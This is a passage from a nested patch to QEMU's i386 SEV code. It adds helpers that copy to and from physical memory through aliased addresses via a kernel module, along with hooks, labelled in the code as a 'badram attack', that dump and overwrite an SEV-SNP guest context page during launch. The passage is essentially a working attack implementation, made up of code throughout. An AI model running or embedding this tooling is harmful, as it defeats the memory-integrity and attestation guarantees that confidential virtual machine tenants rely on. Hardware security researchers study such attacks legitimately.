++    uint8_t m1[msg_len], m2[msg_len], mxor[msg_len], buf1[msg_len], buf2[msg_len], bufxor[msg_len];
++    _get_rand_bytes(m1, msg_len);
++    _get_rand_bytes(m2, msg_len);
++    for(size_t i = 0; i < msg_len; i++) {
++        mxor[i] = m1[i] ^ m2[i];
++    }
++
++    if( flush_ext(source_pa, msg_len, memcpy_cfg) ) {
++        if(verbose) err_log("flush_range for 0x%jx failed\n", source_pa);
++        return CHECK_ALIAS_ERR_ACCESS;
++    }
++
++    if( memcpy_topa_ext(source_pa, m1, msg_len, memcpy_cfg) ) {
++        if(verbose) err_log("memcpy_topa for 0x%jx failed\n", source_pa);
++        return CHECK_ALIAS_ERR_ACCESS;
++    }
++
++    //read alias_candidate_pa
++    if( memcpy_frompa_ext(buf1, alias_candidate, msg_len, memcpy_cfg) ) {
++        if(verbose) err_log("memcpy_frompa for 0x%jx failed\n", alias_candidate);
++        return CHECK_ALIAS_ERR_ACCESS;
++    }
++
++
++    //write m2 to source_pa
++    if( memcpy_topa_ext(source_pa, m2, msg_len, memcpy_cfg) ) {
++        if(verbose) err_log("memcpy_topa for source_pa 0x%jx failed\n", source_pa);
++        return CHECK_ALIAS_ERR_ACCESS;
++    }
++
++    //read from target_pa
++    if( memcpy_frompa_ext(buf2, alias_candidate, msg_len, memcpy_cfg) ) {
++        if(verbose) err_log("memcpy_frompa for target_pa 0x%jx failed\n", alias_candidate);
++        return CHECK_ALIAS_ERR_ACCESS;
++    }
++
++    /*
++    * We wrote  m1 and m2 to source_pa and read them through alias_candidate_pa
++    * buf1 and buf2 contain the values read through surce_pa.
++    * To account for memory scrambling, we dont compare them directly but check if
++    * buf1^buf2 matches m1^m2
++    */
++
++//#define FIND_ALIAS_DEBUG
++#ifdef FIND_ALIAS_DEBUG
++    printf("alias_candidate: 0x%jx\n", alias_candidate);
++    printf("m1: ");
++    _hexdump(m1, msg_len);
++    printf("buf1: ");
++    _hexdump(buf1, msg_len);
++
++    printf("m2: ");
++    _hexdump(m2, msg_len);
++    printf("buf2: ");
++    _hexdump(buf2, msg_len);
++
++    printf("m1 ^ m2: ");
++    _hexdump(mxor, msg_len);
++#endif
++           
++    int found_matching_xor = 1;
++    for(size_t i = 0; i < msg_len; i++) {
++        bufxor[i] = buf1[i] ^ buf2[i];
++        if( mxor[i] != bufxor[i]) {
++            found_matching_xor = 0;
++        }
++    }
++#ifdef FIND_ALIAS_DEBUG
++    printf("buf1 ^ buf2: ");
++    _hexdump(bufxor, msg_len);
++#endif
++
++    if( found_matching_xor ) {
++        if(verbose) {
++            uint64_t pa_xor = source_pa ^ alias_candidate;
++            printf("Found alias for 0x%jx at 0x%jx! xor diff = 0x%jx\n", source_pa, alias_candidate, pa_xor);
++            printf("buf1: ");
++            _hexdump(buf1, msg_len);
++            printf("buf2: ");
++            _hexdump(buf2, msg_len);
++             printf("got xor: ");
++            _hexdump(mxor, msg_len);
++            printf("want xor: ");
++            _hexdump(mxor, msg_len);
++
++            printf("Reserved Page Errors: %ju, Map Failed Errors: %ju\n",
++                memcpy_cfg->out_stats.reserved_pages, memcpy_cfg->out_stats.map_failed);
++        }
++        return 0;
++    }
++    return CHECK_ALIAS_ERR_NO_ALIAS;
++}
+diff --git a/target/i386/readalias.h b/target/i386/readalias.h
+new file mode 100644
+index 0000000000..34caf4512b
+--- /dev/null
++++ b/target/i386/readalias.h
+@@ -0,0 +1,126 @@
++#include <stdlib.h>
++#include <stdbool.h>
++#include <stdint.h>
++
++
++#include "readalias_ioctls.h"
++
++#define PAGE_SIZE  4096
++#define PAGE_SHIFT 12
++
++typedef struct  {
++  size_t reserved_pages;
++  size_t map_failed;
++} page_stats_t;
++
++
++/**
++ * Open the kernel module
++ * 
++ * @returns Whether the kernel module was opened successfully.
++ */
++int open_kmod(void);
++
++/**
++ * Close the kernel module
++ * 
++ * @returns Whether the kernel module was closed successfully.
++ */
++void close_kmod(void);
++
++
++struct pamemcpy_cfg {
++ //Output parameter filled with information about mapping errors
++ page_stats_t out_stats;
++ //If true abort if there is an access errror
++ bool err_on_access_fail;
++ //If true, try to access reserved pages anyways
++ bool access_reserved;
++ //Control flushing method or disable flushing
++ enum flush_method flush_method;
++};
++
++/**
++ * Copy memory to physical address.
++ * 
++ * @param dst: The physical address of the destination.
++ * @param src: The buffer to copy from.
++ * @param count: The number of bytes to copy.
++ * @param out_stats: Output param. Filled with information about mapping errors and reserved pages errors
++ * @param err_on_access_fail: If true, we return -1 when there is an error accessing the page. Otherwise we
++ * only docucment this in `out_stats`
++ * 
++ * @returns 0 on success
++ */
++int memcpy_topa(uint64_t dst, void* src, size_t count, page_stats_t* out_stats, bool err_on_access_fail);
++
++/**
++ *@brief Like memcpy_topa but with more options
++ *@parameter cfg : control behaviour. Also contains some output paramters
++ *@returns 0 on success
++*/
++int memcpy_topa_ext(uint64_t dst, void* src, size_t count, struct pamemcpy_cfg* cfg);
++
++/**
++ * Copy memory from physical address.
++ * 
++ * @param dst: The buffer to copy to.
++ * @param src: The physical address to copy from.
++ * @param out_stats: Informaiton about mapping and reserved pages errors
++ * @param count: The number of bytes to copy.
++ * @param out_stats: Output param. Filled with information about mapping errors and reserved pages errors
++ * @param err_on_access_fail: If true, we return -1 when there is an error accessing the page. Otherwise we
++ * only docucment this in `out_stats`
++
++ * @returns 0 on success
++ */
++int memcpy_frompa(void* dst, uint64_t src, size_t count, page_stats_t* out_stats, bool err_on_access_fail);
++
++/**
++ *@brief Like memcpy_frompa but with more options
++ *@parameter cfg : control behaviour. Also contains some output paramters
++ *@returns 0 on success
++*/
++int memcpy_frompa_ext(void* dst, uint64_t src, size_t count, struct pamemcpy_cfg* cfg);
++
++/**
++ * Flush a given memory range from the cache. This function will flush at the
++ * granularity of a page.
++ * 
++ * @param pa: The starting physical address to flush.
++ * @param count: The number of bytes to flush.
++ * @param out_stats: Output param. Filled with information about mapping errors and reserved pages errors
++ * @param err_on_access_fail: If true, we return -1 when there is an error accessing the page. Otherwise we
++ * only docucment this in `out_stats`
++ * 
++ * @returns 0 on success
++ */
++int clflush_range(uint64_t pa, size_t count, page_stats_t* out_stats, bool err_on_access_fail);
++
++/**
++ @brief Issue `wbinvd` instruction on all cpu cores
++*/
++int wbinvd_ac(void);
++
++
++/**
++ * @brief Flush the given memory range using the selected method
++*/
++int flush_ext(uint64_t pa, size_t count, struct pamemcpy_cfg* cfg);
++
++//check alias failed to perform a memory access
++//this might happend if the page is reserved
++#define CHECK_ALIAS_ERR_ACCESS -1
++//check alias could perform all memory accesses but alias_candidate was no alias
++#define CHECK_ALIAS_ERR_NO_ALIAS -2
++
++/**
++ * @brief Check if `alis_candidate` is an alias for source_pa. Both addrs
++ * must have at least 64 byte alignment
++ * @param source_pa
++ * @param alias_candidate
++ * @param memcpy_cfg : config options for pa memcpy functions
++ * @param verbose : if true, log more error information 
++ * @return 0 on success, CHECK_ALIAS_ERR_ACCESS on access error, CHECK_ALIAS_ERR_NO_ALIAS if access succeeded but the candidate is no alias
++*/
++int check_alias(uint64_t source_pa, uint64_t alias_candidate, struct pamemcpy_cfg* memcpy_cfg,bool verbose);
+diff --git a/target/i386/readalias_ioctls.h b/target/i386/readalias_ioctls.h
+new file mode 100644
+index 0000000000..6b54406e75
+--- /dev/null
++++ b/target/i386/readalias_ioctls.h
+@@ -0,0 +1,38 @@
++#ifndef READALIAS_IOCTLS_H
++#define READALIAS_IOCTLS_H
++
++#ifdef __KERNEL__
++#include <linux/types.h>
++#else
++#include <stdint.h>
++#endif
++
++enum flush_method {
++  //Don't flush
++  FM_NONE,
++  //Flush using clflush
++  FM_CLFLUSH,
++  //Flush using wbinvd on all cores
++  FM_WBINVD,
++};
++
++struct args {
++  void* buffer;
++  uint64_t   count;
++  uint64_t   pa;
++  enum flush_method   flush;
++  //if 1, we access pages even if they are marked as reserved
++  int access_reserved;
++};
++
++#define MEMCPY_TOPA    _IOW('f', 0x20, struct args*)
++#define MEMCPY_FROMPA  _IOW('f', 0x21, struct args*)
++#define FLUSH_PAGE     _IOW('f', 0x22, struct args*)
++#define WBINVD_AC      _IOW('f', 0x23, struct args*)
++
++//ioctl return code to indicate that page is reserved
++#define RET_RESERVED 1
++//ioctl return code to indicate that we failed to map the page
++#define RET_MAPFAIL 2
++
++#endif
+diff --git a/target/i386/sev.c b/target/i386/sev.c
+index 7c87f45de7..d5b14c2920 100644
+--- a/target/i386/sev.c
++++ b/target/i386/sev.c
+@@ -16,6 +16,7 @@
+ #include <linux/kvm.h>
+ #include <linux/psp-sev.h>
+ 
++#include <stdio.h>
+ #include <sys/ioctl.h>
+ 
+ #include "qapi/error.h"
+@@ -40,6 +41,12 @@
+ #include "exec/address-spaces.h"
+ #include "qemu/queue.h"
+ 
++
++//badram code includes
++#include "readalias.h"
++#include "mem_range_repo.h"
++#include "badram_get_gctx.h"
++
+ /* hard code sha256 digest size */
+ #define HASH_SIZE 32
+ 
+@@ -1220,6 +1227,200 @@ snp_page_type_to_str(int type)
+     }
+ }
+ 
++//base path used for badram attack config files
++static const char* ENV_ALIAS_CSV = "BADRAM_ALIAS_CSV";
++static const char* ENV_REPLAY_DATA = "BADRAM_REPLAY_DATA";
++static const char* ENV_DUMP_DIR = "BADRAM_DUMP_DIR";
++
++static char* get_alias_csv(void) {
++    char* c;
++    c = getenv(ENV_ALIAS_CSV);
++    if(c) {
++        return c;
++    }
++    return (char*)"./edited-aliases.csv";
++}
++
++static char* get_replay_data(void) {
++    char* c;
++    c = getenv(ENV_REPLAY_DATA);
++    if(c) {
++        return c;
++    }
++    return (char*)"./replay-with-this.bin";
++}
++
++static char* get_dump_dir(void) {
++    char* c;
++    c = getenv(ENV_DUMP_DIR);
++    if(c) {
++        return c;
++    }
++    return (char*)"./";
++}
++
++static int request_replay(void) {
++    uint64_t alias_gctx_pa;
++    mem_range_t* mrs = NULL;
++    uint64_t* alias_masks = NULL;
++    size_t mrs_len;
++    FILE* replay_data_file;
++    size_t replay_bytes = 0x40;
++    const uint64_t replay_offset = 0x460;
++    uint8_t replay_data_buffer[replay_bytes];
++    uint64_t gctx_pa;
++    int n;
++    struct badram_gctx_replay_args args = {0};
++    const char* alias_file_path = get_alias_csv();
++    const char* replay_data_path = get_replay_data();
++
++    //check if file at replay_data_path exists. For now,
++    //this is our "toggle" whether we should do the replay or not
++    replay_data_file = fopen(replay_data_path, "rb");
++    if(!replay_data_file) {
++        printf("Failed to open replay_data file at %s\nSkipping replay\n",
++            replay_data_path);
++        //N.B: NOT and error (for now)
++        return 0;
++    }
++    if( 1 != (n = fread(replay_data_buffer, replay_bytes, 1, replay_data_file))) {
++        err_log("failed to read from replay data file : n=%d, strerror=%s\n", n, strerror(errno));
++        goto error;;
++    }
++
++
++
++    if(parse_csv((char*)alias_file_path, &mrs, &alias_masks, &mrs_len)) {
++        err_log("failed to parse aliases from %s\n", alias_file_path);
++        goto error;
++    }
++
++    if(open_kmod()) {
++        err_log("failed to open readalias kernel module? Did you insmod it?\n");
++        goto error;
++    }
++
++    if(badram_get_gctx(getpid(), &gctx_pa)) {
++        err_log("badram_get_gctx failed\n");
++        goto error;
++    }
++    printf("Using 0x%jx for guest context page\n", gctx_pa);
++
++    if(get_alias(gctx_pa, mrs, alias_masks, mrs_len, &alias_gctx_pa)) {
++        err_log("failed to get alias for 0x%jx\n", gctx_pa);
++        goto error;
++    }
++
++
++    args.data = replay_data_buffer;
++    args.data_len = replay_bytes;
++    args.gctx_offset = replay_offset;
++    args.expected_gctx_pa = gctx_pa;
++    args.gctx_alias_pa = alias_gctx_pa;
++    
++    if(badram_request_gctx_replay(args)) {
++        err_log("badram_request_gctx_replay failed\n");
++        goto error;
++    }
++
++    
++    int ret = 0;
++    goto cleanup;
++error:
++    ret = -1;
++cleanup:
++    close_kmod();
++    if(mrs) free(mrs);
++    if(alias_masks) free(alias_masks);
++    if(replay_data_file) fclose(replay_data_file);
++    return ret;   
++}
++
++static int dump_context_page(void) {
++    const char* alias_file_path = get_alias_csv();
++    static size_t invocation_count = 0;
++    static uint64_t gctx_pa = 0;
++    uint64_t alias_gctx_pa;
++    mem_range_t* mrs = NULL;
++    const size_t gctx_bytes = 4096;
++    uint8_t* gctx_buffer = NULL;
++    FILE* gctx_dump_file = NULL;
++    char* gctx_dump_path = NULL;
++    uint64_t* alias_masks = NULL;
++    size_t mrs_len;
++    page_stats_t stats;
++
++    if(parse_csv((char*)alias_file_path, &mrs, &alias_masks, &mrs_len)) {
++        err_log("failed to parse aliases from %s\n", alias_file_path);
++        goto error;
++    }
++
++    if(open_kmod()) {
++        err_log("failed to open readalias kernel module? Did you insmod it?\n");
++        goto error;
++    }
++
++    if( gctx_pa == 0 ) {
++        if(badram_get_gctx(getpid(), &gctx_pa)) {
++            err_log("badram_get_gctx failed\n");
++            goto error;
++        }
++    }
++    printf("Using 0x%jx for guest context page\n", gctx_pa);
++
++    if(get_alias(gctx_pa, mrs, alias_masks, mrs_len, &alias_gctx_pa)) {
++        err_log("failed to get alias for 0x%jx\n", gctx_pa);
++        goto error;
++    }
++
++    if(wbinvd_ac()) {
++        err_log("wbinvd failed\n");
++        goto error;
++    }
++    gctx_buffer = malloc(gctx_bytes);
++    if(memcpy_frompa(gctx_buffer, alias_gctx_pa, gctx_bytes , &stats , true )) {
++        err_log("memcpy_frompa failed\n");
++        goto error;
++    }
++    if(wbinvd_ac()) {
++        err_log("wbinvd failed\n");
++        goto error;
++    }
++
++    size_t gctx_dump_path_max_len = strlen(get_dump_dir()) + 256;
++    gctx_dump_path = malloc(gctx_dump_path_max_len);
++    {
++        int n = snprintf(gctx_dump_path, gctx_dump_path_max_len, "%s/gctx-dump-%02ju.bin", get_dump_dir(), invocation_count);
++        if( n < 0 || n > gctx_dump_path_max_len) {
++            err_log("snprintf failed\n");
++            goto error;
++        }
++    }
++    gctx_dump_file = fopen(gctx_dump_path, "wb");
++    if(!gctx_dump_file) {
++        err_log("failed to create dump file %s\n", gctx_dump_path);
++        goto error;
++    }
++    if( 1 != fwrite(gctx_buffer, gctx_bytes, 1, gctx_dump_file)) {
++        err_log("failed to write gctx content to file\n");
++        goto error;
++    }
++    printf("%s:%d %s: %juth invocation\n", __FILE__, __LINE__, __FUNCTION__, invocation_count);
++    int ret = 0;
++    goto cleanup;
++error:
++    ret = -1;
++cleanup:
++    close_kmod();
++    if(mrs) free(mrs);
++    if(alias_masks) free(alias_masks);
++    if(gctx_dump_file) fclose(gctx_dump_file);
++    if(gctx_buffer) free(gctx_buffer);
++    if(gctx_dump_path) free(gctx_dump_path);
++    invocation_count += 1;
++    return ret;
++}
++
+ static int
+ sev_snp_launch_update(SevSnpGuestState *sev_snp_guest, SevLaunchUpdateData *data)
+ {
+@@ -1252,6 +1453,11 @@ sev_snp_launch_update(SevSnpGuestState *sev_snp_guest, SevLaunchUpdateData *data
+         goto out;
+     }
+ 
++    if(dump_context_page()) {
++        error_report("%s:%d %s : dump_context_page failed!\n", __FILE__, __LINE__, __FUNCTION__);
++        ret = -1;
++        goto out;
++    }
+     ret = sev_ioctl(SEV_COMMON(sev_snp_guest)->sev_fd,
+                     KVM_SEV_SNP_LAUNCH_UPDATE,
+                     &update, &fw_error);
+@@ -1613,8 +1819,27 @@ sev_snp_launch_finish(SevSnpGuestState *sev_snp)
+         }
+     }
+ 
++    if(dump_context_page()) {
++        error_report("%s:%d %s : dump_context_page failed!\n", __FILE__, __LINE__, __FUNCTION__);
++        exit(1);
++    }
++
+     trace_kvm_sev_snp_launch_finish(sev_snp->id_block, sev_snp->id_auth,
+                                     sev_snp->host_data);
++
++    printf("%s:%d %s : have id block? %d\n",
++        __FILE__, __LINE__, __FUNCTION__, finish->id_block_en);
++
++    //luca: we cannot do the replay here, as the ioctl handler in the kernel
++    //also does the the vmcb measurements which will modify our replayed data
++    //I have implemented the replay directly inside the kernel
++
++    if(request_replay()) {
++        error_report("%s:%d %s : request_replay failed", __FILE__, __LINE__, __FUNCTION__);
++        exit(1);
++    }
++
++    
+     ret = sev_ioctl(SEV_COMMON(sev_snp)->sev_fd, KVM_SEV_SNP_LAUNCH_FINISH,
+                     finish, &error);
+     if (ret) {
+@@ -1623,6 +1848,11 @@ sev_snp_launch_finish(SevSnpGuestState *sev_snp)
+         exit(1);
+     }
+ 
++    if(dump_context_page()) {
++        error_report("%s:%d %s : dump_context_page failed!\n", __FILE__, __LINE__, __FUNCTION__);
++        exit(1);
++    }
++
+     sev_set_guest_state(SEV_COMMON(sev_snp), SEV_STATE_RUNNING);
+ 
+     /* add migration blocker */
+-- 
+2.34.1
+
